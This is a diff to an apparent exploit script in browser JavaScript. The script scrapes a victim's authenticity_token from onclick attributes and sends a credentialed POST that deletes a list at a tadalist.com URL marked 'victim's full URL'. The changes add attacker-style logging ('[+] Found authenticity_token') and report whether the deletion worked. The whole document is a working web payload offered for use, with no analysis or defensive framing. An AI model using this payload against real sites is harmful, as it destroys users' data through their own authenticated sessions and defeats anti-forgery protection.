@@ -1,5 +1,6 @@
 (async () => {
   try {
+    console.log('[+] Starting token extraction...');
     let token = null;
     for (const el of document.querySelectorAll('[onclick]')) {
       const onclick = el.getAttribute('onclick');
@@ -10,20 +11,35 @@
         break;
       }
     }
-    if (!token) return;
+    if (!token) {
+      console.error('[-] authenticity_token not found!');
+      return;
+    }
+    console.log('[+] Found authenticity_token:', token);
 
-    const targetUrl = 'https://123456.tadalist.com/lists/2356146';  // victim's full URL here
+    const targetUrl = 'https://123456.tadalist.com/lists/2356146';  // change to victim's full URL
+    console.log('[+] Sending DELETE request to:', targetUrl);
 
     const formData = new URLSearchParams();
     formData.append('_method', 'delete');
     formData.append('authenticity_token', token);
 
-    await fetch(targetUrl, {
+    const response = await fetch(targetUrl, {
       method: 'POST',
       credentials: 'include',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: formData.toString(),
       redirect: 'follow'
     });
-  } catch {}
+
+    if (response.ok) {
+      console.log('[+] List deleted successfully!');
+    } else {
+      console.warn(`[-] Failed to delete list. Status: ${response.status}`);
+      const text = await response.text();
+      console.log('[>] Response snippet:', text.slice(0, 500));
+    }
+  } catch (err) {
+    console.error('[-] Error occurred:', err);
+  }
 })();
